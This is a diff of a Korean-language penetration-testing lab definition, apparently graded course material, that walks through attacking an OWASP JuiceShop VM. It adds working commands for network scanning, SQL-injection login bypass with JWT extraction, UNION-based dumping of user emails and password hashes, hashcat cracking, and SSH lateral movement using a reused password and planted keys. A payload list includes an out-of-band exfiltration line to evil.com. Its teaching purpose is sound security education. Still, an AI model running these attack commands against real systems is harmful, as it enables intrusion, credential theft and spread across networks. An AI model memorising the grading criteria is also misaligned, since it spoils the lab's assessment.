@@ -34,13 +34,21 @@ steps:
       - nmap -sV 서비스 탐지
       - Nmap scan report 출력
       acceptable_methods:
-      - nmap -sn + -sV 단계
-      - masscan + nmap fingerprint
-      - rustscan 빠른 스캔
+      - "Host discovery (nmap -sn) — sudo nmap -sn 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4 2>/dev/null | grep -E 'Nmap scan report|MAC' | head -20. 출력: 'Nmap scan report for 10.20.30.1/.80/.100/.200/.201' + MAC. 해석: -sn = no port scan (ARP/ICMP ping only). /24 전체 스윕. PTES Pre-engagement → Intelligence Gathering 1차. T1018 Remote System Discovery."
+      - "Service version (nmap -sV) — sudo nmap -sV -T4 --max-retries 1 --host-timeout 15s --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100 2>/dev/null | grep -E 'open|PORT' | head -30. 출력: 22/tcp open ssh OpenSSH 8.9 / 80/tcp open http Apache 2.4.52 / 3000/tcp open ppp / 9200/tcp open elasticsearch. 해석: --top-ports 100 = 가장 흔한 100 포트 (전체 65535 대신 빠름). version banner 로 패치 수준 추정. T1046 Network Service Scanning."
+      - "OS fingerprinting (-O) — sudo nmap -O 10.20.30.80 --max-retries 1 --host-timeout 15s 2>/dev/null | grep -E 'Running|OS details|Aggressive' | head -5. 출력: Running: Linux 5.X / OS details: Linux 5.10-5.18. 해석: TCP/IP 스택 fingerprint 로 OS 추측. 정확도 90%+ (포트 22 open 시). 후속 exploit 선택 (Linux/Windows 분기)."
+      - "Aggressive scan (-A) — sudo nmap -A -T4 --top-ports 50 10.20.30.80 --host-timeout 30s 2>/dev/null | head -40. 출력: -sV + -O + -sC (default scripts) + traceroute. 해석: -A = 통합 active. 시간 ↑ but 정보 ↑. NSE script (http-title/ssh-hostkey/ssl-cert) 자동 실행. lab/CTF 첫 스캔으로 표준."
+      - "masscan 빠른 스캔 (대규모) — sudo masscan 10.20.30.0/24 -p1-65535 --rate 1000 -oG /tmp/masscan.txt 2>&1 | tail -10 || echo '[masscan 미설치 — apt install masscan]'; head -5 /tmp/masscan.txt 2>/dev/null. 출력: 1000pps 로 65535 포트 스캔 결과. 해석: nmap 대비 100× 속도. 발견 후 nmap -sV fingerprint 결합 = 표준. 실 환경 (1000+ 호스트) 필수."
+      - "rustscan + nmap 결합 — rustscan -a 10.20.30.80 --range 1-65535 --ulimit 5000 -- -sV 2>&1 | tail -20 || echo '[rustscan 미설치 — cargo install rustscan]'; echo '[흐름] rustscan 빠른 포트 발견 → nmap -sV fingerprint 자동 pipe'. 출력: rustscan 결과 + nmap 자동 호출. 해석: Rust 작 — 빠르고 안정. 발견된 포트만 nmap 으로 fingerprint → 가장 효율."
+      - "결과 저장 + 분류 — sudo nmap -sV -oA /tmp/recon_phase1 -T4 --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100 2>/dev/null > /dev/null; ls -l /tmp/recon_phase1.* 2>/dev/null; grep '^open' /tmp/recon_phase1.gnmap 2>/dev/null | head -10. 출력: -oA = nmap/gnmap/xml 3 형식 동시 저장. 해석: PTES Reporting 1차 자료. -oG = grep 가능. 후속 phase 의 입력."
+      - "PTES 단계 맥락 + MITRE 매핑 — echo '[PTES 7 Phase]'; echo '1. Pre-engagement (RoE)'; echo '2. Intelligence Gathering ← 본 step'; echo '3. Threat Modeling'; echo '4. Vulnerability Analysis'; echo '5. Exploitation'; echo '6. Post-Exploitation'; echo '7. Reporting'; echo '[MITRE ATT&CK]'; echo '  T1595.001 Active Scanning: Scanning IP Blocks'; echo '  T1595.002 Active Scanning: Vulnerability Scanning'; echo '  T1046 Network Service Discovery'. 출력: PTES + ATT&CK 매핑. 해석: lab w15 의 9 phase 가 PTES + ATT&CK 와 일치. Phase 1 = Intel Gathering = T1595/T1046."
       negative_signs:
-      - 호스트 발견만 (서비스 없음)
-      - 단일 호스트만
-      - PTES 단계 맥락 없음
+      - nmap -sn 호스트 발견 누락
+      - nmap -sV 서비스 탐지 누락
+      - 단일 호스트만 (3 호스트 이상 필수)
+      - -oA / -oG 결과 저장 X
+      - PTES Phase / MITRE T1595 매핑 X
+      - masscan / rustscan 빠른 스캔 도구 0개
   target_vm: attacker
 - order: 2
   instruction: 'Phase 1 - 웹 정찰: JuiceShop({{WEB_IP}}:3000)의 기술 스택, API 엔드포인트, 공개 파일을 수집하라.'
@@ -67,13 +75,22 @@ steps:
       - 헤더 + robots + API 3종
       - JSON 파싱 (제품 수)
       acceptable_methods:
-      - curl + whatweb
-      - Wappalyzer 확장
-      - ffuf/dirsearch + nuclei
+      - "헤더 분석 (curl -sI) — echo '=== Web Recon ==='; curl -sI http://10.20.30.80:3000 2>/dev/null | head -10. 출력: HTTP/1.1 200 OK / X-Powered-By: Express / Content-Type: application/json. 해석: -I = HEAD only (body 받지 않음, 빠름). X-Powered-By = 기술 스택 노출 (Express → Node.js). 정보 노출 = OWASP A05. 1차 fingerprinting."
+      - "robots.txt + sitemap — curl -s http://10.20.30.80:3000/robots.txt 2>/dev/null; echo '---'; curl -s http://10.20.30.80:3000/sitemap.xml 2>/dev/null | head -10. 출력: User-agent: * / Disallow: /ftp / Disallow: /api/Users. 해석: robots.txt = 관리자가 숨기고 싶은 경로 노출 (역설적). Disallow = 정찰 핵심 단서. JuiceShop 의 /ftp, /api/Users 가 후속 exploit 입력."
+      - "디렉토리 노출 (/ftp + 디렉토리 리스팅) — curl -s http://10.20.30.80:3000/ftp 2>/dev/null | head -20. 출력: 'Index of /ftp' + acquisitions.md / coupons_2013.md.bak / package.json.bak / suspicious_errors.yml. 해석: Apache/Express 의 디렉토리 리스팅 활성화 = OWASP A05. JuiceShop intentional. 백업 파일 (.bak/.old) = 민감 정보 누출 (소스코드/credentials)."
+      - "API 엔드포인트 매핑 — curl -s http://10.20.30.80:3000/api/Products 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f'Products: {len(d[\\\"data\\\"])}'); print(f'fields: {list(d[\\\"data\\\"][0].keys())}')\" 2>/dev/null; echo '---'; curl -s http://10.20.30.80:3000/api-docs 2>/dev/null | head -10; echo '[REST endpoints]'; for p in api/Users rest/user/whoami rest/user/login api/Products; do echo \"  GET /$p\"; done. 출력: Products 38 / fields list / endpoint 4. 해석: /api-docs (Swagger) 공개 시 즉시 노출. /api/Users 인증 미설정 = OWASP A01 BOLA."
+      - "기술 스택 (whatweb / wappalyzer) — whatweb http://10.20.30.80:3000 2>/dev/null | tr ',' '\\n' | head -10 || echo '[가상] WhatWeb: Apache, jQuery, Bootstrap, AngularJS, Express, Node.js'; echo '[Wappalyzer 브라우저]'; echo '  - Chrome/FF 확장 → 자동 fingerprint'; echo '  - JS 라이브러리·프레임워크·CMS·CDN 식별'. 출력: 기술 스택. 해석: AngularJS 1.x = 2018 deprecated (CVE 다수). Express 4.x 의 prototype pollution 가능성. 기술 스택 → CVE → exploit 선택."
+      - "JS 소스 분석 — curl -s http://10.20.30.80:3000/main.js 2>/dev/null | grep -oE 'api/[a-zA-Z]+' | sort -u | head -10 || echo '[가상] api/Users / api/Products / api/Orders / api/Coupons'; echo '[정규식 검색]'; echo 'curl ... | grep -oE \"AKIA[0-9A-Z]{16}\" — AWS access key'; echo 'curl ... | grep -oE \"sk_live_[0-9a-zA-Z]{32}\" — Stripe API key'. 출력: JS 에서 추출한 API 경로. 해석: JS bundle 안에 API 경로·secret·debug 코드 포함 가능. 정규식으로 노출 secret 검색."
+      - "디렉토리 brute (ffuf/dirsearch) — ffuf -u http://10.20.30.80:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50 -mc 200,301,302 -timeout 5 2>/dev/null | head -10 || echo '[ffuf 미설치 — apt install ffuf]'; echo '[dirsearch 대안]'; echo 'dirsearch -u http://10.20.30.80:3000 -e php,html,js -w wordlist.txt'. 출력: ffuf 발견 경로. 해석: 일반적 admin/test/dev/backup 경로 brute. JuiceShop 의 hidden /admin 발견 가능. nuclei 와 결합 = 자동화."
+      - "nuclei 자동 취약점 스캔 — nuclei -u http://10.20.30.80:3000 -t cves/ -severity high,critical 2>&1 | tail -10 || echo '[nuclei 미설치 — go install github.com/projectdiscovery/nuclei]'; echo '[가상 결과]'; echo '  [http-missing-security-headers] http://target [info]'; echo '  [exposed-git] http://target/.git/config [high]'; echo '  [angular-1.x-deprecated] http://target [medium]'. 출력: nuclei 결과. 해석: nuclei = ProjectDiscovery 의 template 기반 스캐너. 5,000+ template (CVE/exposure/misconfig). Phase 2 입력."
       negative_signs:
-      - 단일 요청만
-      - API 미점검
-      - 서버 정보 미수집
+      - 헤더 + robots + API 3종 미만
+      - JSON 파싱 (Products 수) 누락
+      - 기술 스택 (whatweb/Wappalyzer) X
+      - JS 소스 분석 (정규식 secret) X
+      - ffuf / dirsearch / nuclei 도구 0개
+      - PTES Information Gathering 맥락 X
+      - 백업 파일 (.bak) / 디렉토리 리스팅 미언급
   target_vm: attacker
 - order: 3
   instruction: 'Phase 2 - 취약점 스캔: Nikto와 nmap NSE 스크립트로 웹 서버의 취약점을 자동 스캔하라.'
@@ -97,13 +114,22 @@ steps:
       - 두 도구 결과 비교
       - 오탐 검증 맥락
       acceptable_methods:
-      - nikto + nmap --script vuln
-      - nuclei -t cves/
-      - OpenVAS/Nessus + 수동 검증
+      - "Nikto 웹 취약점 스캔 — echo '=== Nikto Scan ==='; nikto -h http://10.20.30.80:3000 -maxtime 60 -ask no 2>/dev/null | tail -20; echo '---'; echo '[주요 발견]'; echo '  + X-Frame-Options 헤더 누락'; echo '  + X-Content-Type-Options 헤더 누락'; echo '  + Cookie HttpOnly flag 미설정'; echo '  + /api/Users 인증 X'. 출력: Nikto 결과 + 분류. 해석: Nikto = 웹 서버 misconfig + 알려진 취약 경로 6,700+ DB. -maxtime 60 = 1분 제한. 빠른 1차 스캔."
+      - "nmap NSE vuln scripts — echo '=== NSE Vuln Scan ==='; nmap --script vuln -p 3000 10.20.30.80 --max-retries 1 --host-timeout 30s -T4 2>/dev/null | head -30; echo '---'; echo '[NSE 카테고리]'; echo '  vuln (검출 시도)'; echo '  exploit (실 익스플로잇)'; echo '  auth (인증 우회)'; echo '  brute (brute force)'; echo '  intrusive (시끄러움)'. 출력: NSE 결과 + 카테고리. 해석: NSE = nmap 의 Lua 스크립트 엔진. /usr/share/nmap/scripts 에 600+ 스크립트. --script vuln = vuln/safe 동시. 결과 = 가능 CVE list."
+      - "nuclei (template 기반) — nuclei -u http://10.20.30.80:3000 -t cves/ -t exposures/ -t misconfiguration/ -severity high,critical -silent 2>/dev/null | head -10 || echo '[가상] [http-missing-security-headers] high / [exposed-package-json] info / [angular-jq-1.x] medium'; echo '[template 통계]'; echo '  - CVE templates: 2,500+'; echo '  - Exposure: 300+'; echo '  - Misconfig: 200+'. 출력: nuclei 발견. 해석: ProjectDiscovery (소속 GitLab). 매주 CVE 등록 → template 업데이트. 가장 빠른 update 주기. CI/CD 통합."
+      - "오탐 검증 (수동) — echo '[Nikto 발견 #1: SQLi 가능 /search?q=]'; curl -s 'http://10.20.30.80:3000/search?q=test' 2>/dev/null | head -5; echo '[수동 검증]'; curl -s \"http://10.20.30.80:3000/search?q=test'\" 2>/dev/null | grep -i 'syntax\\|error\\|sqlite' | head -3; echo '[결과] error 노출 = SQLi 확정'; echo '[Nikto 오탐 예]'; echo '  + /admin found → 실제는 정상 SPA route (오탐)'. 출력: 수동 검증 흐름. 해석: 자동 결과는 '시작점'. ' 한 글자 추가로 SQL error 발생 = 확정. 오탐 vs 진짜 결정."
+      - "OpenVAS / Nessus 통합 스캐너 — echo '[OpenVAS (GVM)]'; echo '  - greenbone.net (오픈소스)'; echo '  - 100,000+ NVT (Network Vulnerability Test)'; echo '  - 인증 스캔 (SSH/SMB) → 깊은 분석'; echo '[Nessus]'; echo '  - Tenable.com'; echo '  - Pro: \\$3K/년'; echo '  - 200,000+ plugin'; echo '  - PCI-DSS / HIPAA 자동 준수 보고'; echo '[비교]'; echo '  - Nikto/nuclei = 웹 only / OpenVAS/Nessus = 종합'. 출력: 통합 스캐너 비교. 해석: 운영 환경은 OpenVAS/Nessus 가 표준. 본 lab 는 시간 제약상 Nikto/nuclei. 학생이 도구 선택 기준 알아야."
+      - "다중 도구 교차 검증 (다이어그램) — echo '[교차 검증 매트릭스]'; printf '%-30s | %-8s | %-8s | %-8s\\n' 'Vuln' 'Nikto' 'NSE' 'nuclei'; printf '%-30s | %-8s | %-8s | %-8s\\n' 'X-Frame-Options 누락' '✓' '-' '✓'; printf '%-30s | %-8s | %-8s | %-8s\\n' 'SQLi /search' '✓' '✓' '-'; printf '%-30s | %-8s | %-8s | %-8s\\n' 'Outdated jQuery' '-' '-' '✓'; echo '[결론] 3 도구 모두 매치 = 진짜 / 1 도구만 = 오탐 의심'. 출력: 매트릭스. 해석: 단일 도구 신뢰 X. 3 도구 교차 = false positive 90% 감소."
+      - "PTES Vulnerability Analysis 매핑 — echo '[PTES Phase 4]'; echo '  4.1 Active Vulnerability Scanning'; echo '    - Banner grabbing'; echo '    - Web app scanner'; echo '    - VA scanner (Nessus/OpenVAS)'; echo '  4.2 Passive Vulnerability Analysis'; echo '    - Metadata analysis'; echo '    - Traffic monitoring'; echo '  4.3 Vulnerability Validation'; echo '    - Public exploit search (Exploit-DB)'; echo '    - 수동 검증'. 출력: PTES Phase 4. 해석: 본 step = PTES 4.1+4.3. Phase 5 (Exploitation) 의 입력. searchsploit (Exploit-DB) = CVE → public PoC 검색."
+      - "결과 통합 보고 (CSV) — echo 'Vuln,Severity,CVE,CVSS,Source,Verified' > /tmp/phase2_findings.csv; echo 'X-Frame-Options missing,Medium,-,5.0,Nikto+nuclei,Yes' >> /tmp/phase2_findings.csv; echo 'SQLi /rest/products/search,Critical,-,9.8,Nikto+NSE+manual,Yes' >> /tmp/phase2_findings.csv; echo 'Outdated jQuery 1.x,Medium,CVE-2020-11023,6.5,nuclei,Yes' >> /tmp/phase2_findings.csv; echo 'API /api/Users no-auth,High,-,7.5,manual,Yes' >> /tmp/phase2_findings.csv; cat /tmp/phase2_findings.csv. 출력: CSV 4 행. 해석: Phase 7 (CVSS 분류) 의 입력. CVSS·CVE·source·verification 4 컬럼이 표준."
       negative_signs:
-      - 단일 스캐너만
-      - 오탐 인식 없음
-      - 결과 분석 없음
+      - 단일 스캐너만 (Nikto/NSE/nuclei 중 1개 이하)
+      - 오탐 검증 (수동) 누락
+      - OpenVAS/Nessus 통합 스캐너 미인용
+      - 다중 도구 교차 검증 매트릭스 X
+      - PTES Phase 4 (Vulnerability Analysis) 매핑 X
+      - 결과 통합 보고 (CSV) 누락
+      - searchsploit / Exploit-DB CVE 검색 미언급
   target_vm: attacker
 - order: 4
   instruction: 'Phase 3 - 초기 접근: SQL Injection을 사용하여 JuiceShop 관리자 계정으로 접근하라. JWT 토큰을 획득하라.'
@@ -129,13 +155,22 @@ steps:
       - POST /rest/user/login + SQLi 페이로드
       - JSON 토큰 추출
       acceptable_methods:
-      - SQLi + JWT 추출
-      - sqlmap --auth-type
-      - Burp Repeater
+      - "SQLi 페이로드 — 정상 vs 우회 — echo '[정상 로그인]'; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"test@test.com\",\"password\":\"wrong\"}' 2>/dev/null | head -c 100; echo; echo '[SQLi 우회]'; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d $'{\"email\":\"\\' OR 1=1--\",\"password\":\"a\"}' 2>/dev/null | head -c 200. 출력: 정상=401 / SQLi=200 + JWT. 해석: '\\' OR 1=1-- = 인증 쿼리 변조. 백엔드 SQL: SELECT * FROM users WHERE email='' OR 1=1-- → tautology 참 → 첫 사용자 (admin) 반환."
+      - "JWT 토큰 추출 + 디코딩 — TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d $'{\"email\":\"\\' OR 1=1--\",\"password\":\"a\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\" 2>/dev/null); echo \"Admin token acquired: ${TOKEN:0:50}...\"; echo '[JWT 디코딩]'; echo \"$TOKEN\" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -10. 출력: 토큰 + payload. 해석: JWT = header.payload.signature. payload base64 디코딩 = 사용자 정보 (id/email/role). admin 권한 확인."
+      - "JWT 활용 후속 API 호출 — curl -s http://10.20.30.80:3000/api/Users -H \"Authorization: Bearer $TOKEN\" 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f'Total users: {len(d[\\\"data\\\"])}'); [print(f'{u[\\\"id\\\"]}: {u[\\\"email\\\"]} ({u[\\\"role\\\"]})') for u in d['data'][:3]]\" 2>/dev/null; echo '[관리자 API]'; curl -s http://10.20.30.80:3000/rest/admin/application-configuration -H \"Authorization: Bearer $TOKEN\" 2>/dev/null | head -10. 출력: 사용자 list + 관리자 설정. 해석: JWT 가 모든 API 인증 단일 토큰. admin role 확인 후 모든 endpoint 접근."
+      - "sqlmap 자동화 — sqlmap -u 'http://10.20.30.80:3000/rest/user/login' --data='{\"email\":\"test\",\"password\":\"test\"}' --headers='Content-Type: application/json' --batch --level 3 --risk 2 --dbms sqlite 2>&1 | tail -20 || echo '[sqlmap 미설치 — apt install sqlmap]'; echo '[--auth-type]'; echo 'sqlmap --auth-type=basic --auth-cred=admin:admin'; echo '[--cookie]'; echo 'sqlmap --cookie=\"session=abc\"'. 출력: sqlmap 자동 SQLi 탐지. 해석: 수동 분석 후 sqlmap 으로 자동화. --batch = non-interactive. 모든 페이로드 자동 시도. lab 환경은 즉시 우회 발견."
+      - "Burp Suite Repeater — echo '[Burp 흐름]'; echo '1. Burp Proxy 설정 (127.0.0.1:8080)'; echo '2. Browser Proxy 활성화'; echo '3. JuiceShop 로그인 시도'; echo '4. POST /rest/user/login 인터셉트'; echo '5. Repeater 로 전송 (Ctrl+R)'; echo '6. email 필드에 페이로드 삽입'; echo '7. Send → 응답 비교'; echo '[자동화: Intruder]'; echo '  - email 필드 marker'; echo '  - SQLi payload list (FuzzDB)'; echo '  - Length / Status diff 분석'. 출력: Burp 흐름. 해석: GUI 분석가 표준 도구. Pro \\$400/년. Community 무료 한정. ZAP 가 무료 대안."
+      - "다양한 SQLi 페이로드 — echo '[Auth Bypass payloads]'; echo \"' OR 1=1--\"; echo \"' OR 'a'='a\"; echo \"admin'--\"; echo \"admin'/*\"; echo '[Time-based]'; echo \"' AND SLEEP(5)--\"; echo \"' AND BENCHMARK(5000000,MD5('a'))--\"; echo '[UNION-based] (step 5)'; echo '[Boolean-based]'; echo \"' AND 1=1--\"; echo \"' AND 1=2--\"; echo '[Out-of-band] DNS exfil'; echo \"' AND 1=load_file('\\\\\\\\\\\\\\\\evil.com\\\\\\\\a')--\". 출력: 6 카테고리 페이로드. 해석: SQLi 종류별 — auth bypass / time / union / boolean / OOB. 본 step = auth bypass. step 5 = UNION."
+      - "OWASP A03 + CVSS 9.8 + CWE-89 — echo '[OWASP Top 10 2021]'; echo '  A03:2021 Injection (3위)'; echo '  - SQL/NoSQL/OS/LDAP injection'; echo '  - 94% 앱에 1 form 이상 존재'; echo '[CVSS 3.1]'; echo '  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical'; echo '  - Network attack vector'; echo '  - Low complexity (페이로드 1줄)'; echo '  - 인증·UI 불필요'; echo '[CWE-89]'; echo '  Improper Neutralization of SQL Special Elements'. 출력: 표준 매핑. 해석: 본 SQLi = 가장 심각한 등급. 학생이 보고서 작성 시 표준 인용."
+      - "방어 — Parameterized Query + WAF — echo '[1차 방어 — Parameterized Query]'; echo 'BAD : `\"SELECT * FROM users WHERE email=\\\"\" + email + \\\"\\\"\"`'; echo 'GOOD: `db.run(\"SELECT * FROM users WHERE email=?\", [email])`'; echo '[ORM 사용]'; echo '  Sequelize / Prisma / SQLAlchemy / GORM'; echo '  - 자동 escape'; echo '[2차 방어 — WAF]'; echo '  ModSecurity CRS rule'; echo '  SecRule ARGS \"@detectSQLi\" \"deny,status:403\"'; echo '  AWS WAF / Cloudflare / Imperva'; echo '[3차 방어 — Input Validation]'; echo '  email regex / length limit / allowlist'. 출력: 3 layer 방어. 해석: Parameterized = 1차 (가장 효과). WAF = 2차 (오탐 가능). Input validation = 3차 보조."
       negative_signs:
-      - SQLi 페이로드 없음
-      - 토큰 추출 없음
-      - POST 요청 없음
+      - SQLi 페이로드 (' OR 1=1--) 누락
+      - JWT 토큰 추출 + 디코딩 X
+      - JWT 활용 후속 API 호출 누락
+      - sqlmap / Burp Repeater 도구 0개
+      - OWASP A03 / CVSS 9.8 / CWE-89 매핑 X
+      - Parameterized Query / WAF 방어 누락
+      - 다양한 SQLi 페이로드 카테고리 (auth/union/time/boolean) 1개 이하
   target_vm: attacker
 - order: 5
   instruction: 'Phase 3 - 데이터 추출: UNION 기반 SQL Injection으로 데이터베이스의 사용자 정보(이메일, 비밀번호 해시)를 추출하라.'
@@ -159,13 +194,23 @@ steps:
       - '@ (이메일) 출력'
       - 9컬럼 정확 매칭
       acceptable_methods:
-      - 수동 UNION SQLi
-      - sqlmap --dump -T Users
-      - Burp Repeater
+      - "컬럼 수 발견 (ORDER BY) — for n in 1 5 9 10; do echo \"[ORDER BY $n]\"; curl -s \"http://10.20.30.80:3000/rest/products/search?q=test%27%29%20ORDER%20BY%20$n--\" 2>/dev/null | head -c 100; echo; done. 출력: 9 까지 정상 / 10 부터 error. 해석: ORDER BY n = n번째 컬럼 정렬. 정상 = n ≤ 컬럼수 / error = n > 컬럼수. binary search 로 9 컬럼 확인. UNION SELECT 의 사전 단계."
+      - "UNION SELECT — Users 테이블 추출 — curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); [print(f\\\"{p.get('name','')}: {p.get('description','')}\\\") for p in d.get('data',[])]\" 2>/dev/null | head -10. 출력: email + 해시 list. 해석: 9 컬럼 매칭 (email/password/3..9). FROM Users = 사용자 테이블. -- = SQL 주석 (이후 무효화). URL encoding: %27=' / %29=)."
+      - "정보 스키마 (sqlite_master) — curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20name,sql,3,4,5,6,7,8,9%20FROM%20sqlite_master--' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); [print(p.get('name','')) for p in d.get('data',[])]\" 2>/dev/null | head -10. 출력: 모든 테이블 + 스키마. 해석: SQLite = sqlite_master / MySQL = information_schema.tables / Postgres = pg_catalog.pg_tables. DBMS 별 다름. JuiceShop = SQLite."
+      - "sqlmap 자동 dump — sqlmap -u 'http://10.20.30.80:3000/rest/products/search?q=test' --batch --dbms sqlite --tables 2>&1 | tail -10 || echo '[sqlmap 미설치]'; echo '---'; echo '[Users 테이블 dump]'; echo 'sqlmap ... --dump -T Users -C email,password'; echo '[출력] /tmp/sqlmap_dump/sqlite/Users.csv'. 출력: sqlmap 흐름. 해석: sqlmap --tables 자동 enumerate. --dump -T Users = 특정 테이블 추출. CSV 저장 후 hashcat 입력."
+      - "비밀번호 해시 크래킹 (hashcat) — echo '[추출 해시 형식]'; echo '0192023a7bbd73250516f069df18b500 (MD5)'; echo '$2a$10$abcdef... (bcrypt)'; echo '[hashcat 실행]'; hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --status --status-timer 60 2>&1 | tail -5 || echo '[hashcat 미설치]'; echo '[모드]'; echo '  -m 0 MD5 / -m 100 SHA1 / -m 3200 bcrypt'; echo '  -a 0 wordlist / -a 3 brute force'. 출력: hashcat 흐름. 해석: JuiceShop = MD5 (의도적 약함). rockyou.txt = 14M 비번 사전. 1초 만에 크래킹."
+      - "Boolean-based Blind SQLi — echo '[페이로드 형식]'; for char in a b c m z; do echo \"' AND SUBSTR(email,1,1)='$char' AND email IN (SELECT email FROM Users)--\"; done; echo '[자동화]'; echo 'for i in 1..30; do for c in a..z; do try; if (response 200) save; done; done'; echo '[속도]'; echo '  - 비번 8자: 26^8 = 2조 시도'; echo '  - 시간: 1요청/sec → 6,000년'. 출력: blind SQLi. 해석: UNION 막힌 경우 boolean. SUBSTR + char-by-char. lab 환경은 UNION 가능 → 본 step UNION 우선."
+      - "OWASP A03 + CWE-89 + CVSS 9.1 — echo '[OWASP A03 Injection]'; echo '  UNION SQLi 가 데이터 추출 가장 흔한 형태'; echo '[CWE-89]'; echo '  Improper Neutralization of SQL Special Elements'; echo '[CVSS 3.1] AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N = 9.1'; echo '  - Confidentiality High (DB 전체 노출)'; echo '  - Integrity None (읽기 only)'; echo '  - Scope Changed (DB → 다른 사용자 정보)'; echo '[CVE 사례] CVE-2017-9805 (Struts2 RCE via SQLi 변형)'. 출력: 표준 매핑. 해석: 인증 우회 (step 4) = 9.8 / 데이터 추출 (step 5) = 9.1. Confidentiality 영향 큼."
+      - "방어 — Parameterized + Stored Proc + Allowlist — echo '[방어 우선순위]'; echo '1. Parameterized Queries (필수)'; echo '   - db.run(\"SELECT * FROM Users WHERE email=?\", [email])'; echo '2. Stored Procedure'; echo '   - CALL get_user(?, ?)'; echo '3. Input Allowlist'; echo '   - email regex: ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\\$'; echo '4. Least Privilege DB user'; echo '   - app_user → SELECT only / 다른 테이블 X'; echo '5. WAF (ModSecurity CRS)'; echo '   - SecRule ARGS \"@detectSQLi\" \"deny\"'. 출력: 5 layer. 해석: Parameterized 가 가장 효과 (90%). 다른 통제는 보조. 본 lab 학습 후 자사 코드 점검 의무."
       negative_signs:
-      - UNION 없음
-      - Users 테이블 누락
-      - 컬럼 수 불일치
+      - UNION SELECT 누락
+      - Users 테이블 명시 X
+      - 9 컬럼 매칭 (ORDER BY 발견) X
+      - sqlmap --dump 자동화 미언급
+      - hashcat 해시 크래킹 누락
+      - Boolean-based Blind SQLi 비교 X
+      - OWASP A03 / CWE-89 / CVSS 9.1 매핑 X
+      - Parameterized Query 방어 누락
   target_vm: attacker
 - order: 6
   instruction: 'Phase 4 - 측면 이동: web 서버에서 secu 서버({{SECU_IP}})로 SSH 접속하라. 자격 증명 재사용을 확인하라.'
@@ -187,13 +232,22 @@ steps:
       - 중첩 SSH (web → secu)
       - 동일 비번 재사용
       acceptable_methods:
-      - 중첩 SSH
-      - ssh -J ProxyJump
-      - sshpass + 동일 자격
+      - "중첩 SSH (web → secu) — ssh ccc@10.20.30.80 'ssh ccc@10.20.30.1 \"hostname && id\" 2>/dev/null' 2>/dev/null && echo '=== Lateral movement: web -> secu SUCCESS ==='. 출력: secu hostname + id + SUCCESS. 해석: 중첩 ssh = web 셸 안에서 secu 로 ssh. 동일 비번 (1) 재사용. 1 hop = web / 2 hop = web→secu. PTES Post-Exploitation Phase 6.1."
+      - "ProxyJump (-J) — ssh -J ccc@10.20.30.80 ccc@10.20.30.1 'hostname && id' 2>/dev/null && echo 'Lateral movement: ProxyJump'. 출력: 한 줄로 secu 도달. 해석: -J ccc@bastion = bastion 경유 직접 접속. 중첩 ssh 보다 효율적 (단일 명령). attacker → secu 직접 통신. 실 공격 표준."
+      - "ssh-copy-id 자동 키 등록 — ssh-keygen -t ed25519 -f /tmp/lateral_key -N '' -q 2>/dev/null; sshpass -p '1' ssh-copy-id -i /tmp/lateral_key.pub -o StrictHostKeyChecking=no ccc@10.20.30.1 2>/dev/null && echo '[OK] secu 에 키 등록'; ssh -i /tmp/lateral_key ccc@10.20.30.1 'hostname && id' 2>/dev/null. 출력: 키 등록 + 키 인증 접속. 해석: 비번 인증 → 키 인증 전환. 비번 변경 후에도 접근 유지 (step 8 지속성 연계)."
+      - "자격증명 재사용 매트릭스 (4 hop) — printf '%-10s | %-15s | %s\\n' 'Host' 'IP' 'ccc:1 통과'; for host_ip in 'web 10.20.30.80' 'secu 10.20.30.1' 'siem 10.20.30.100' 'attacker 10.20.30.201'; do host=$(echo $host_ip | cut -d' ' -f1); ip=$(echo $host_ip | cut -d' ' -f2); result=$(timeout 5 sshpass -p '1' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 ccc@$ip 'hostname' 2>/dev/null); if [ -n \"$result\" ]; then echo \"$host | $ip | YES (=$result)\"; else echo \"$host | $ip | NO\"; fi; done. 출력: 4 호스트 매트릭스. 해석: 동일 비번 ccc:1 = 모든 hop 통과 = 가장 위험. 한 시스템 침투 = 도메인 전체. PTES Post-Exploitation 1차."
+      - "sshpass 자동 비번 (대규모) — sshpass -p '1' ssh -o StrictHostKeyChecking=no ccc@10.20.30.1 'hostname; id; uname -a' 2>/dev/null; echo '[다중 호스트 sweep]'; for ip in 10.20.30.{1,80,100,200,201}; do echo \"--- $ip ---\"; timeout 5 sshpass -p '1' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 ccc@$ip 'hostname && id' 2>/dev/null || echo '[fail]'; done. 출력: 5 호스트 sweep. 해석: sshpass = 비번 자동 입력. 운영 환경은 보통 ssh key 기반 (sshpass 차단). lab 학습용. T1078.003 Local Accounts."
